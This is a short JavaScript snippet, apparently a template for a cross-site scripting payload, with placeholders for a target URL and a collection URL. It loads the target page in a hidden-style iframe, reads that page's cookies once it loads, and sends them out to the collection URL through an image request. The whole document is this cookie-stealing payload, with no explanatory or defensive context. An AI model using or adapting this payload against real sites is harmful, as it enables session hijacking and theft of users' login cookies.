var iframe = document.createElement("iframe");
iframe.src = "%target-url%";
iframe.id = "frame";
document.body.appendChild(iframe);
iframe.onload = function (){
	var c = document.getElementById('frame').contentWindow.document.cookie;
	var a=new Image();a.src='%example-url%?c='+escape(c);
}
